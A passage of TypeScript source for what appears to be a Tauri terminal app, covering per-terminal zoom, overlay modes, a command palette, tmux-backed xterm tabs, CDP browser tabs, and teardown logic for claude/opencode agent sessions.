  getCurrentWebview().setZoom(store.get().zoom).catch(console.error);
}
function nudgeZoom(delta: number) {
  const z = Math.min(ZOOM_MAX, Math.max(ZOOM_MIN, +(store.get().zoom + delta).toFixed(2)));
  store.set({ zoom: z });
  applyZoom();
}
function resetZoom() {
  store.set({ zoom: 1 });
  applyZoom();
}

// ---- per-terminal zoom (font size, persisted per tab id) ----
// The terminal that currently holds keyboard focus. ⌘+/-/0 zoom THAT terminal's
// font when set; otherwise they fall back to the webview/chrome zoom above. Set
// on the xterm textarea focus/blur in openTab.
let focusedTermId: string | null = null;
const TERM_FONT_DEFAULT = 13;
const TERM_FONT_MIN = 6;
const TERM_FONT_MAX = 40;
const termFontSize = (id: string) => store.get().tabZoom[id] ?? TERM_FONT_DEFAULT;
function applyTermFontSize(id: string, px: number) {
  const t = tabs.get(id);
  if (!t) return;
  t.term.options.fontSize = px;
  t.fit.fit(); // reflow cols/rows + tell the pty via onResize
}
function setTermFontSize(id: string, px: number) {
  const clamped = Math.min(TERM_FONT_MAX, Math.max(TERM_FONT_MIN, px));
  store.set({ tabZoom: { ...store.get().tabZoom, [id]: clamped } });
  applyTermFontSize(id, clamped);
}
// Route a zoom gesture: a focused terminal zooms its own font; else the chrome.
function zoomGesture(delta: number) {
  if (focusedTermId && tabs.has(focusedTermId)) {
    setTermFontSize(focusedTermId, termFontSize(focusedTermId) + (delta > 0 ? 1 : -1));
  } else {
    nudgeZoom(delta);
  }
}
function zoomResetGesture() {
  if (focusedTermId && tabs.has(focusedTermId)) {
    setTermFontSize(focusedTermId, TERM_FONT_DEFAULT);
  } else {
    resetZoom();
  }
}

// ---- overlay controller ----
// Coexist with another app (VSCode) using built-in window APIs only: a "follow"
// mode that shows/hides as overlayTarget gains/loses focus (off the frontmost-app
// stream), a faded (dimmed) look, a keyboard click-through toggle, and a compact
// "mini" layout + window size. No non-activating NSPanel (needs a native crate),
// so show() does activate us — but follow keys off frontmostApp, so the instant
// focus moves to a third app we hide again.
const OVERLAY_NORMAL = new LogicalSize(820, 540); // matches tauri.conf default
const OVERLAY_MINI = new LogicalSize(440, 360);
let overlayMiniApplied: boolean | null = null;
let overlayClickThrough = false;

function applyOverlay() {
  const s = store.get();
  const app = document.getElementById("app");
  app?.classList.toggle("overlay-faded", s.overlayFade);
  app?.classList.toggle("mini", s.miniMode);
  const win = getCurrentWindow();
  // Resize only on an actual mini flip, not every store change.
  if (overlayMiniApplied !== s.miniMode) {
    overlayMiniApplied = s.miniMode;
    win.setSize(s.miniMode ? OVERLAY_MINI : OVERLAY_NORMAL).catch(() => {});
  }
  // Ride along over the target's desktop across Spaces while an overlay is active.
  win.setVisibleOnAllWorkspaces(s.overlayMode !== "off").catch(() => {});
  // Follow: mirror the target's focus (self-focus is filtered from frontmostApp).
  if (s.overlayMode === "follow" && s.frontmostApp) {
    if (s.frontmostApp === s.overlayTarget) win.show().catch(() => {});
    else win.hide().catch(() => {});
  }
}

function toggleMiniMode() {
  store.set({ miniMode: !store.get().miniMode });
  flashStatus(store.get().miniMode ? "mini mode" : "full mode");
}
function toggleOverlayFade() {
  store.set({ overlayFade: !store.get().overlayFade });
}
function cycleOverlayMode() {
  const next = store.get().overlayMode === "off" ? ("follow" as const) : ("off" as const);
  store.set({ overlayMode: next });
  flashStatus(next === "follow" ? `overlay: follow ${store.get().overlayTarget}` : "overlay: off");
}
// Click-through: the window stops receiving mouse events (they pass to the app
// behind). Keyboard-only — while on you can't click the window to turn it back
// off, so it toggles by key by design.
async function toggleClickThrough() {
  overlayClickThrough = !overlayClickThrough;
  await getCurrentWindow().setIgnoreCursorEvents(overlayClickThrough).catch(() => {});
  flashStatus(overlayClickThrough ? "click-through on" : "click-through off");
}

const TAB_COMMANDS: Command[] = [
  // The palette lists every command below that carries a `title`. ⌘⇧P, the
  // VSCode-standard binding.
  { id: "palette.open", keys: ["$mod+Shift+p"], title: "Show All Commands", group: "Palette", run: () => openPalette() },
  { id: "tab.next", keys: ["$mod+Shift+BracketRight", "Control+Tab"], title: "Next Tab", group: "Tabs", run: () => focusTabByOffset(1) },
  { id: "tab.prev", keys: ["$mod+Shift+BracketLeft", "Control+Shift+Tab"], title: "Previous Tab", group: "Tabs", run: () => focusTabByOffset(-1) },
  { id: "tab.close", keys: ["$mod+w"], title: "Close Tab", group: "Tabs", run: closeActiveTab },
  { id: "tab.open", keys: ["$mod+t"], title: "New Tab at Current Directory", group: "Tabs", run: openTabAtPwd },
  { id: "tab.reopen", keys: ["$mod+Shift+t"], title: "Reopen Closed Tab", group: "Tabs", run: reopenLastTab },
  { id: "tab.browser", keys: [], title: "Open Browser", group: "Tabs", run: () => openBrowserTab() },
  { id: "browser.quality", keys: [], title: "Cycle Render Quality", group: "Browser", run: () => cycleBrowserQuality() },
  { id: "browser.perf", keys: [], title: "Toggle Performance Mode (1x)", group: "Browser", run: () => setBrowserPerf(!cdpPerf()) },
  // "Super XP": grainy pixel font everywhere (chrome + terminal). Persisted.
  { id: "skin.xpPixel", keys: [], title: "Toggle Super XP (pixel font)", group: "Skin", run: () => store.set({ xpPixel: !store.get().xpPixel }) },
  { id: "skin.cycle", keys: [], title: "Cycle Skin", group: "Skin", run: () => store.set({ skin: nextSkin(store.get().skin) }) },
  // The top toolbar is opt-in; these keep its actions reachable when it's hidden.
  { id: "view.toolbar", keys: [], title: "Toggle Top Toolbar", group: "View", run: () => store.set({ showToolbar: !store.get().showToolbar }) },
  { id: "view.mode", keys: [], title: "Toggle Dark Mode", group: "View", run: () => store.set({ mode: store.get().mode === "dark" ? "light" : "dark" }) },
  { id: "view.shot", keys: [], title: "Screenshot to Active Terminal", group: "View", run: () => captureToPrompt() },
  // Favorite the active tab's latest AI turn (claude/opencode) into favorites.db.
  { id: "ai.favTurn", keys: ["$mod+Shift+s"], title: "Favorite Latest AI Turn", group: "AI", run: () => void favoriteCurrentTurn() },
  // Reload the webview — recover from a crashed React render without restarting
  // the app (tmux sessions outlive the reload, so nothing is lost).
  { id: "app.reload", keys: ["$mod+r"], title: "Reload Window", group: "App", run: () => location.reload() },
  // Safe reload: reload but skip reading persisted state (dock layout, tabs, …)
  // so a corrupt value can't re-jam startup. One-shot; the next layout change
  // rewrites the bad copy. See SAFE_BOOT in state.ts.
  {
    id: "app.safeReload",
    keys: ["$mod+Shift+r"],
    title: "Reload Window (Safe Boot)",
    group: "App",
    run: () => {
      try {
        sessionStorage.setItem("SAFE_BOOT", "1");
      } catch {
        /* ignore */
      }
      location.reload();
    },
  },
  // Zoom: cmd +/-/0. A focused terminal zooms its own font (persisted per tab);
  // otherwise the webview chrome (rail + toolbars) zooms (persisted, 0.5–2.0).
  { id: "app.zoomIn", keys: ["$mod+Equal", "$mod+Shift+Equal"], title: "Zoom In", group: "App", run: () => zoomGesture(ZOOM_STEP) },
  { id: "app.zoomOut", keys: ["$mod+Minus"], title: "Zoom Out", group: "App", run: () => zoomGesture(-ZOOM_STEP) },
  { id: "app.zoomReset", keys: ["$mod+Digit0"], title: "Reset Zoom", group: "App", run: zoomResetGesture },
  // Overlay controls: mini layout, faded panel, follow-focus mode, click-through.
  { id: "overlay.mini", keys: ["$mod+Shift+m"], title: "Toggle Mini Mode", group: "Overlay", run: toggleMiniMode },
  { id: "overlay.fade", keys: ["$mod+Shift+d"], title: "Toggle Fade", group: "Overlay", run: toggleOverlayFade },
  { id: "overlay.mode", keys: ["$mod+Shift+o"], title: "Cycle Overlay Mode", group: "Overlay", run: cycleOverlayMode },
  { id: "overlay.clickThrough", keys: ["$mod+Shift+i"], title: "Toggle Click-Through", group: "Overlay", run: () => void toggleClickThrough() },
  // cmd/ctrl+1..9 jump to a tab (9 = last). Palette-hidden (no title): too many,
  // and the palette is for discovery, not numbered jumps.
  ...Array.from({ length: 9 }, (_, i) => ({
    id: `tab.goto${i + 1}`,
    keys: [`$mod+${i + 1}`],
    run: () => focusTabN(i + 1),
  })),
];

// opts let a Space override the agent command and launch cwd; plain sessions
// fall back to QUICK_CMD and the backend default (HOME).
function openTab(
  name: string,
  opts: { command?: string | null; cwd?: string | null; graphics?: boolean } = {},
) {
  const id = sessionId(name);
  if (tabs.has(id)) {
    activate(id);
    return;
  }

  // openTab is mechanical: it opens exactly the command it's handed. Resume is a
  // deliberate gesture (⌘⇧T reopen, or the worktree "auto-resume latest" toggle),
  // resolved by the caller — NOT here — so "new · X" stays a fresh session.

  // Visible confirmation that a reopen actually resumed (vs started fresh) —
  // matches either reopen path since both bake the --resume/--session flag in.
  const rm = opts.command?.match(/\s--(?:resume|session)\s+(\S+)/);
  if (rm) {
    console.log("[resume]", name, opts.command);
    flashStatus(`↻ resuming ${rm[1].slice(0, 8)}`);
  }

  const el = document.createElement("div");
  el.className = "term-host";
  // Live in the pool (in-document, so xterm can measure) until dockview adopts
  // it into the terminal's panel.
  document.getElementById("panel-pool")!.appendChild(el);

  const term = new Terminal({
    // Menlo renders the body text; the rest are per-glyph fallbacks for
    // powerline separators + Nerd Font icons (PUA codepoints Menlo lacks). The
    // "Nerd Font" names win if installed; "for Powerline" is the guaranteed
    // separator fallback already on disk. Install full icons with:
    //   brew install --cask font-hack-nerd-font
    fontFamily: termFontFamily(), // Menlo chain, or Perfect DOS VGA when Super XP is on
    fontSize: termFontSize(id), // persisted per-tab zoom (default 13)
    cursorBlink: true,
    allowProposedApi: true,
    // tmux mouse mode is on (wheel-scroll + forwarding to claude/opencode), which
    // makes a plain drag go to tmux copy-mode and fight native selection. Hold
    // Option to force xterm's own selection instead, iTerm-style.
    macOptionClickForcesSelection: true,
    theme: THEMES[store.get().skin],
  });
  const fit = new FitAddon();
  term.loadAddon(fit);
  term.open(el);

  // Graphics sessions (awrit) get an overlay canvas for kitty-graphics frames
  // forwarded by the Rust proxy, and skip tmux (which filters graphics APCs).
  // Infer from the command too, so reload records predating the graphics flag
  // (and any awrit launch) still restore the overlay.
  const cmd = opts.command ?? QUICK_CMD[name] ?? null;
  const graphics = opts.graphics ?? /^\s*awrit\b/.test(cmd ?? "");
  const overlay = graphics ? new GraphicsOverlay(el) : undefined;
  tabs.set(id, { id, name, term, fit, el, graphics, overlay });

  // OSC 52 -> macOS clipboard. tmux (set-clipboard on) emits this when a mouse
  // drag selects text in copy-mode, and TUIs (opencode) emit it on their own
  // copy. xterm doesn't touch the system clipboard on its own (security), so
  // without this bridge a selection lands only in tmux's buffer and ⌘V pastes
  // nothing — the "can't copy after leaving opencode" case.
  term.parser.registerOscHandler(52, (data) => {
    // data = "<targets>;<base64|?>" (targets e.g. "c"/"p"; "?" is a read query).
    const b64 = data.slice(data.indexOf(";") + 1);
    if (!b64 || b64 === "?") return true;
    try {
      const bytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
      void navigator.clipboard.writeText(new TextDecoder().decode(bytes));
    } catch {
      /* malformed payload: ignore */
    }
    return true; // handled; don't pass through
  });

  // ⌘-click a token to run its clickRules action (url->open, path->editor,
  // else->rg). xterm's link provider gives the hover underline + pointer and
  // correct hit-testing for the openable subset; its activate routes through the
  // same dispatchClick as the miss handler below. ⌘ gates it so plain clicks
  // (cursor placement etc.) still reach the TUI.
  term.registerLinkProvider({
    provideLinks(y, cb) {
      const line = term.buffer.active.getLine(y - 1); // y is 1-based absolute row
      if (!line) return cb(undefined);
      const text = line.translateToString(true);
      const links: ILink[] = [];
      const activate = (e: MouseEvent, t: string) => {
        if (!e.metaKey) return; // ⌘ required; plain click stays with the app
        dispatchClick(t, tabMetaById(id)?.cwd ?? "");
      };
      // Quoted spans first: '…'/"…"/`…` is one openable unit (paths with spaces).
      // Record the quote columns so the \S+ pass below skips the fragments inside.
      const spans: Array<{ o: number; c: number }> = [];
      for (const m of text.matchAll(/(['"`])(.+?)\1/g)) {
        const inner = m[2];
        if (!inner.trim()) continue;
        const o = m.index ?? 0; // opening-quote col
        const c = o + m[0].length - 1; // closing-quote col
        spans.push({ o, c });
        const start = o + 1; // inner content col (0-based)
        links.push({
          text: inner,
          range: { start: { x: start + 1, y }, end: { x: start + inner.length, y } },
          activate,
        });
      }
      for (const m of text.matchAll(/\S+/g)) {
        const idx0 = m.index ?? 0;
        if (spans.some((s) => idx0 >= s.o && idx0 <= s.c)) continue; // inside a quoted span
        const raw = m[0];
        // Strip wrapping punctuation, tracking the offset for column math.
        const lead = raw.match(/^[('"<[{]+/)?.[0].length ?? 0;
        const trail = raw.match(/[.,;:)\]}>'"]+$/)?.[0].length ?? 0;
        const tok = raw.slice(lead, raw.length - trail);
        if (!tok || !looksOpenable(tok)) continue;
        const start = idx0 + lead; // 0-based col
        links.push({
          text: tok,
          range: { start: { x: start + 1, y }, end: { x: start + tok.length, y } },
          activate,
        });
      }
      cb(links);
    },
  });

  // ⌘-click that ISN'T on an openable link (no hover underline): take the
  // selection, else the word under the cursor, and run its clickRules action
  // (the catch-all rule greps from cwd). Capture phase so we can swallow it
  // before the TUI sees the click; openable hits fall through to the link
  // provider above (which the linkifier activates on mouseup).
  el.addEventListener(
    "mousedown",
    (e) => {
      if (!e.metaKey || e.button !== 0) return;
      const sel = term.getSelection().trim();
      const word = sel || wordAt(id, e.clientX, e.clientY);
      if (!word) return;
      if (!sel && looksOpenable(word)) return; // link provider handles this hit
      e.preventDefault();
      e.stopPropagation();
      dispatchClick(word, tabMetaById(id)?.cwd ?? "");
    },
    { capture: true },
  );

  // Click anywhere in the host (incl. padding around the xterm) focuses the
  // terminal, so keyboard + scroll work without hunting for the text area.
  el.addEventListener("mousedown", () => term.focus());

  // Shift+wheel scrolls the tmux history even when a full-screen TUI
  // (opencode/claude) has grabbed the mouse so a plain wheel goes to the app
  // (the "scroll randomly doesn't work" case). xterm has no real scrollback here
  // — tmux owns the history — so this drives tmux copy-mode in the backend.
  // Capture phase + stop so the app never sees it; plain wheel is untouched.
  el.addEventListener(
    "wheel",
    (e) => {
      if (!e.shiftKey) return;
      e.preventDefault();
      e.stopPropagation();
      const lines = Math.max(1, Math.round(Math.abs(e.deltaY) / 24));
      invoke("scroll_session", { name, up: e.deltaY < 0, lines }).catch(console.error);
    },
    { capture: true, passive: false },
  );

  // Track which terminal owns keyboard focus so ⌘+/-/0 zoom the right one.
  term.textarea?.addEventListener("focus", () => {
    focusedTermId = id;
  });
  term.textarea?.addEventListener("blur", () => {
    if (focusedTermId === id) focusedTermId = null;
  });

  term.onData((data) => invoke("write_pty", { id, data }).catch(console.error));
  term.onResize(({ cols, rows }) =>
    invoke("resize_pty", { id, cols, rows, ...cellDims(term) }).catch(console.error),
  );

  // iTerm2-style word/line editing. xterm doesn't emit these by default on mac,
  // so we intercept and write the readline/emacs control sequences the shell
  // (and claude/opencode) understand. Returning false stops xterm's own handling
  // (e.g. Alt+b inserting "∫").
  term.attachCustomKeyEventHandler((e) => {
    // Graphics tabs (awrit) speak the kitty keyboard protocol; handle before the
    // keydown-only legacy path so key releases are reported too.
    if (graphics) return kittyKeyHandler(e, id);
    if (e.type !== "keydown") return true;
    // App command? Run it, swallow the key (no pty write), and stop it bubbling
    // to the window keymap listener so it doesn't fire twice.
    if (runMatchingCommand(e)) {
      e.stopPropagation();
      return false;
    }
    const send = (data: string) => {
      // preventDefault is essential: returning false stops xterm from processing
      // the key but does NOT stop the browser default. For keys like Shift+Enter
      // the default inserts a newline into xterm's hidden helper <textarea>, which
      // xterm later flushes on an `input` event — leaking a stray \n at random
      // times (and Alt+Left would trigger browser back-nav). Swallow it here.
      e.preventDefault();
      invoke("write_pty", { id, data }).catch(console.error);
      return false;
    };
    const only = (a: boolean, b: boolean, c: boolean) => a && !b && !c;
    // Shift+Enter: insert a newline instead of submitting. At the byte level
    // Shift+Enter == Enter (both \r), and tmux squashes \r/\n/extended-key
    // sequences down to a bare \n before they reach the app — so the app can't
    // tell it from a submit. The robust path is bracketed paste: wrap one \n in
    // the paste markers and the app inserts it as a literal, editable newline
    // (same as pasting multi-line text), no submit. Survives tmux untouched.
    // Verified through `tmux new-session`; \r\n becomes \n\n, so use one \n.
    if (e.key === "Enter" && e.shiftKey && !e.metaKey && !e.ctrlKey && !e.altKey)
      return send("\x1b[200~\n\x1b[201~");
    if (only(e.altKey, e.metaKey, e.ctrlKey)) {
      if (e.key === "ArrowLeft") return send("\x1bb"); // word back
      if (e.key === "ArrowRight") return send("\x1bf"); // word forward
      if (e.key === "Backspace") return send("\x1b\x7f"); // delete word back
    }
    if (only(e.metaKey, e.altKey, e.ctrlKey)) {
      // Cmd+C: xterm paints its selection in its own layer (not a DOM selection)
      // so copy only when there IS a selection, else fall through. Paste is left
      // to xterm's native handler (its textarea paste event) — handling it here
      // too double-pastes.
      if (e.key === "c" && term.hasSelection()) {
        navigator.clipboard.writeText(term.getSelection()).catch(console.error);
        return false;
      }
      if (e.key === "ArrowLeft") return send("\x01"); // line start (Ctrl-A)
      if (e.key === "ArrowRight") return send("\x05"); // line end (Ctrl-E)
      if (e.key === "Backspace") return send("\x15"); // kill to line start (Ctrl-U)
    }
    return true;
  });

  // Fit AFTER layout so the pty spawns at the real grid size, not the pre-layout
  // 80x24 default that leaves full-screen TUIs (opencode) clipped.
  const command = cmd;
  const cwd = opts.cwd ?? null;
  recordTab(name, command, cwd, graphics); // survives reload; tmux session outlives the webview
  requestAnimationFrame(() => {
    fit.fit();
    const { cols, rows } = term;
    invoke("open_session", {
      id, name, command, cwd, cols, rows, graphics, ...cellDims(term),
    }).catch(console.error);
  });

  // Hand the host element to dockview as a flat, draggable/splittable panel.
  // Adding it makes it active, which fires onTermActivate -> onTermShown.
  addTermPanel(id, tabTitle(name), el);
  activate(id);
  if (store.get().pinnedTabs.length) reflowPinnedTabs();
}

// Minimal async text prompt. window.prompt() is a no-op in the Tauri WKWebview,
// so reuse the command-palette overlay styling for a real input. Resolves to the
// trimmed value, or null on Esc / backdrop click / empty.
function askText(placeholder: string, initial = ""): Promise<string | null> {
  return new Promise((resolve) => {
    const root = document.createElement("div");
    root.className = "cmdp-root";
    const box = document.createElement("div");
    box.className = "cmdp-box";
    const input = document.createElement("input");
    input.className = "cmdp-input";
    input.type = "text";
    input.placeholder = placeholder;
    input.value = initial;
    input.spellcheck = false;
    box.appendChild(input);
    root.appendChild(box);
    const close = (val: string | null) => {
      root.remove();
      resolve(val);
    };
    root.addEventListener("pointerdown", (e) => {
      if (e.target === root) close(null);
    });
    input.addEventListener("keydown", (e) => {
      e.stopPropagation();
      if (e.key === "Enter") {
        e.preventDefault();
        close(input.value.trim() || null);
      } else if (e.key === "Escape") {
        e.preventDefault();
        close(null);
      }
    });
    document.body.appendChild(root);
    queueMicrotask(() => {
      input.focus();
      input.select();
    });
  });
}

// Browser tabs run in a shared headless Chrome over CDP: Rust streams the page's
// JPEG screencast to a canvas (`cdp-frame`), input/resize go back as CDP commands.
// These are NOT terminals — no xterm, no pty — but reuse the dockview panel
// lifecycle (addTermPanel/onTermShown/onTermClosed) keyed by the same id.
const browserTabs = new Map<
  string,
  { id: string; name: string; el: HTMLElement; view: CdpView }
>();

function normalizeUrl(s: string): string {
  if (!s) return "";
  if (/^[a-z]+:\/\//i.test(s) || s.startsWith("about:")) return s;
  if (/^\S+\.\S+/.test(s)) return "https://" + s;
  return "https://www.google.com/search?q=" + encodeURIComponent(s);
}

// Persist a browser tab so a reload reopens it (the CDP target survives a
// webview reload in the Rust CdpStore; a full restart re-creates it at the url).
function recordBrowserTab(name: string, url: string) {
  const cur = store.get().openTabs;
  if (cur.some((t) => t.name === name)) return;
  store.set({ openTabs: [...cur, { name, command: null, cwd: null, browser: true, url }] });
}

// Create the panel + CdpView for a browser tab with an explicit name (so the id
// is stable across reloads). Shared by the URL prompt and the boot replay.
function spawnBrowserTab(name: string, u: string) {
  const id = sessionId(name);
  if (browserTabs.has(id) || tabs.has(id)) {
    activate(id);
    return;
  }
  const el = document.createElement("div");
  el.className = "term-host";
  document.getElementById("panel-pool")!.appendChild(el);
  const view = new CdpView(el, id, u);
  browserTabs.set(id, { id, name, el, view });
  recordBrowserTab(name, u); // survives reload
  addTermPanel(id, tabTitle(name), el); // dockview adopts el into the panel
  flashStatus("starting browser… (first run clones your Chrome profile)");
  // Measure after layout so the screencast starts at the panel's real size;
  // the view's ResizeObserver corrects any later drift.
  requestAnimationFrame(() => {
    const m = view.initialMetrics();
    invoke("cdp_open", {
      id, url: u, width: m.width, height: m.height, dpr: m.dpr, quality: cdpQuality(),
    }).catch((e) => {
      console.error(e);
      flashStatus("browser failed to start");
    });
    view.focus();
  });
}

async function openBrowserTab(url?: string) {
  const raw = (url ?? (await askText("URL", "https://example.com")) ?? "").trim();
  if (!raw) return;
  spawnBrowserTab(`web:${raw}`, normalizeUrl(raw));
}

// Step the screencast JPEG quality to the next preset and re-apply it to every
// open browser tab live (cdp_resize restarts the screencast at the new quality).
function cycleBrowserQuality() {
  const cur = cdpQuality();
  const idx = QUALITY_STEPS.findIndex((q) => q >= cur);
  const next = QUALITY_STEPS[(idx + 1) % QUALITY_STEPS.length];
  setCdpQuality(next);
  for (const { view } of browserTabs.values()) view.applyMetrics();
  flashStatus(`browser render quality: ${next}`);
}

// Flip performance mode (1x screencast) and re-apply to every open browser tab
// so the change takes effect live (cdp_resize restarts the screencast).
function setBrowserPerf(on: boolean) {
  setCdpPerf(on);
  for (const { view } of browserTabs.values()) view.applyMetrics();
  flashStatus(`browser performance mode: ${on ? "on (1x)" : "off"}`);
}

// Make a terminal the active dockview panel. The store/active-sync + focus is
// done in onTermShown when dockview reports the active change.
function activate(id: string) {
  if (tabs.has(id) || browserTabs.has(id)) focusTermPanel(id);
}

// Focus a terminal reliably across a tab switch. A single rAF races dockview:
// the panel may still be hidden that frame (focus on a display:none element is a
// no-op) and dockview can move focus right after. Retry on rAF + a short timeout
// so the keyboard (and keyboard scroll) land in the panel body without a click.
function focusTermSoon(id: string) {
  const go = () => tabs.get(id)?.term.focus();
  requestAnimationFrame(go);
  setTimeout(go, 60);
}

// dockview reports a terminal panel became active (tab click, open, or a
// neighbour closing). Sync the store, log the visit, refit, focus.
function onTermShown(id: string) {
  const b = browserTabs.get(id);
  if (b) {
    setActive(id);
    touchTab(id);
    requestAnimationFrame(() => b.view.focus());
    renderSessionActive();
    return;
  }
  const t = tabs.get(id);
  if (!t) return;
  setActive(id);
  touchTab(id);
  logTabVisit(t.name);
  void warmTurns(id); // warm the ledger so right-click turn-identify stays sync
  requestAnimationFrame(() => {
    t.fit.fit();
    invoke("resize_pty", {
      id, cols: t.term.cols, rows: t.term.rows, ...cellDims(t.term),
    }).catch(() => {});
  });
  focusTermSoon(id);
  renderSessionActive();
}

// Close a terminal: remove its dockview panel; dockview then fires
// onDidRemovePanel -> onTermClosed which disposes the xterm + pty.
function closeTab(id: string) {
  if (tabs.has(id) || browserTabs.has(id)) removeTermPanel(id);
}

// dockview removed a terminal panel (close button, menu, or closeTab). Tear
// down the live resources and re-point active at a surviving terminal.
function onTermClosed(id: string) {
  const b = browserTabs.get(id);
  if (b) {
    b.view.dispose();
    b.el.remove();
    browserTabs.delete(id);
    forgetTab(id); // don't reopen a browser tab the user closed
    invoke("cdp_close", { id }).catch(() => {});
    if (activeId() === id) {
      const next = tabs.keys().next();
      const nextId = next.done ? (browserTabs.keys().next().value ?? null) : next.value;
      setActive(nextId ?? null);
      if (nextId) activate(nextId);
    }
    renderSessionActive();
    return;
  }
  const t = tabs.get(id);
  if (!t) return;
  const name = t.name;
  // Capture before teardown: cwd/command + the live foreground proc decide
  // whether this is an agent tab to EXIT (free RAM) vs a shell we just detach.
  const tabMeta = tabMetaById(id);
  const live = store.get().sessions.find((s) => s.name === name);
  const proc = foregroundProc(live?.commands ?? []);
  const isGraphics = t.graphics ?? false;
  t.overlay?.dispose();
  t.term.dispose();
  t.el.remove();
  tabs.delete(id);
  // Remember it for reopen (⌘⇧T), carrying the original command/cwd.
  const meta = store.get().openTabs.find((o) => o.name === name);
  closedTabs.push({ name, command: meta?.command ?? null, cwd: meta?.cwd ?? null });
  forgetTab(id); // don't reattach a tab the user closed
  // Agent tab → kill the tmux session so claude/opencode isn't left burning RAM
  // (recording its id for --resume first, keyed by session name). Anything else →
  // detach the pty; the tmux session survives (so a reload reattaches it). Decided
  // async because the on-disk session probe is async; see exitOrDetachTab.
  // Serialize teardown: two near-simultaneous closes must NOT interleave their
  // resumeTabs read-modify-write, or both probe-record the same newest-in-cwd id
  // and the 2nd reopen resumes the 1st's session ("rando old session"). Chaining
  // lets each close fully claim its id before the next one probes.
  closeChain = closeChain.then(() => exitOrDetachTab(id, name, tabMeta, proc, isGraphics)).catch(() => {});
  if (activeId() === id) {
    const next = tabs.keys().next();
    const nextId = next.done ? null : next.value;
    setActive(nextId);
    if (nextId) activate(nextId);
  }
  renderSessionActive();
  refreshSessions();
}

// Decide a closed tab's fate: an agent tab is KILLED (frees the RAM claude/
// opencode hold) after best-effort recording its session id for --resume;
// anything else just detaches (tmux survives a reload). The kill fires whenever
// we believe an agent is running — it is NOT gated on resolving the session id,
// so a stale id lookup can't leave claude alive. The agent writes its jsonl
// incrementally, so killing mid-run stays resumable.
async function exitOrDetachTab(
  id: string,
  name: string,
  meta: { cwd: string; command: string | null } | null,
  proc: string,
  isGraphics = false,
) {
  // Graphics tabs (awrit) are never tmux sessions; close_pty kills the child so
  // it can't orphan and hold its profile lock.
  if (isGraphics) {
    invoke("close_pty", { id }).catch(() => {});
    return;
  }
  const sessions = meta ? await tabSessions(tabCwds(id), meta.command) : [];
  const bin = (meta?.command ?? "").trim().split(/\s+/)[0]?.split("/").pop() ?? "";
  // Agent when: the live foreground proc looks like one (claude's version title,
  // opencode.exe, node/bun), the launch command names one, or the proc was
  // unknown (stale list) but the cwd has an on-disk agent session. A known
  // non-agent proc (vim, …) is never killed.
  const isAgent =
    looksLikeAgentProc(proc) ||
    KNOWN_RESUME[bin] != null ||
    (proc === "" && sessions.length > 0);
  if (!isAgent) {
    invoke("close_pty", { id }).catch(() => {}); // tmux session keeps running
    return;
  }
  // Resume id is keyed by SESSION NAME — the stable identity of this tab. A claude
  // session we launched already has the AUTHORITATIVE id recorded at launch
  // (newAgentLaunch's --session-id), so DON'T clobber it with the close-time cwd
  // probe, which only resolves "latest jsonl in this cwd" and would grab a sibling
  // when several sessions share the cwd. The probe is a fallback for agents we
  // didn't launch with a chosen id (e.g. opencode, or a reattached external one).
  if (!store.get().resumeTabs[name]) {
    // Skip ids already claimed by another tab's record so same-cwd siblings each
    // resume a DISTINCT session (the "rando old session" fix). Serialized teardown
    // (closeChain) guarantees prior closes have recorded before we read here.
    const claimed = new Set(Object.values(store.get().resumeTabs).map((r) => r.sessionId));
    const s = meta ? await unclaimedSession(meta, claimed) : null;
    if (s) {
      store.set({
        resumeTabs: { ...store.get().resumeTabs, [name]: { editor: s.editor, sessionId: s.sessionId } },
      });
      console.log("[resume] recorded (probe)", name, "->", s.editor, s.sessionId.slice(0, 8));
    } else {
      console.log("[resume] killed", name, "(no id to resume)");
    }
  } else {
    console.log("[resume] killed", name, "(keeping launch id)");
  }
  await invoke("kill_session", { name }).catch(console.error); // kill regardless of id resolution
  refreshSessions();
}

// Refit one terminal (dockview reports its panel group resized).
function fitTerm(id: string) {
  const t = tabs.get(id);
  if (!t) return;
  t.fit.fit();
  invoke("resize_pty", {
    id, cols: t.term.cols, rows: t.term.rows, ...cellDims(t.term),
  }).catch(() => {});
}

function renderSessionActive() {
  document.querySelectorAll<HTMLLIElement>(".sidebar-lists li").forEach((li) => {
    const id = li.dataset.id;
    li.classList.toggle("active", !!id && id === activeId());
  });
}

// Map pane cwds to worktrees by longest-prefix match against scanned rows.
// Returns the distinct worktree paths those cwds fall under.
function worktreesForPaths(paths: string[], rows: WorktreeRow[]): string[] {
  const out = new Set<string>();
  for (const cwd of paths) {
    let best: WorktreeRow | undefined;
    for (const w of rows) {
      if (cwd === w.worktree || cwd.startsWith(w.worktree + "/")) {
        if (!best || w.worktree.length > best.worktree.length) best = w;
      }
    }
    if (best) out.add(best.worktree);
  }
  return [...out];
}

// The sidebar SESSIONS list mirrors the live tmux sessions (the real running
// shells/agents), not a creator. Click a row to attach/resume it into a tab;
// launching new ones is the job of the quick-launch buttons + new-shell input.
// Order the launcher rows per store.sessionSort. Name is the stable tiebreak.
function sortSessions(live: Session[]): Session[] {
  const { key, dir } = store.get().sessionSort;
  const pinned = new Set(store.get().pinnedSessions);
  const sign = dir === "asc" ? 1 : -1;
  return [...live].sort((a, b) => {
    // Pinned sessions always float to the top, regardless of the sort key.
    const pa = pinned.has(a.name) ? 0 : 1;
    const pb = pinned.has(b.name) ? 0 : 1;
    if (pa !== pb) return pa - pb;
    let c = 0;
    if (key === "name") c = a.name.localeCompare(b.name, undefined, { numeric: true });
    else if (key === "windows") c = a.windows - b.windows;
    else c = a.activity - b.activity;
    return c !== 0 ? c * sign : a.name.localeCompare(b.name, undefined, { numeric: true });
  });
}

// Shells aren't interesting as a "what's running here" label; surface the agent
// or tool instead. Returns the first non-shell foreground command, else "".
const SHELLS = new Set(["zsh", "bash", "fish", "sh", "tmux", "-zsh", "-bash"]);
function foregroundProc(commands: string[]): string {
  return commands.find((c) => !SHELLS.has(c)) ?? "";
}
// Foreground procs that mean "an agent is running here" (vs an idle shell), so
// closing the tab exits it instead of leaving it resident. node/bun cover
// claude/opencode launched through their JS shim.
const AGENT_PROCS = new Set(["claude", "opencode", "node", "bun"]);
// claude reports its VERSION ("2.1.193") as the process title, not "claude", so a
// version-shaped foreground proc is an agent; opencode shows as "opencode.exe".
// Without this, AGENT_PROCS never matches a live claude pane and close detaches
// (leaving claude alive) instead of killing it.
const looksLikeAgentProc = (p: string) =>
  AGENT_PROCS.has(p) || /^\d+\.\d+/.test(p) || p.includes("opencode");
const isPinnedSession = (name: string) => store.get().pinnedSessions.includes(name);
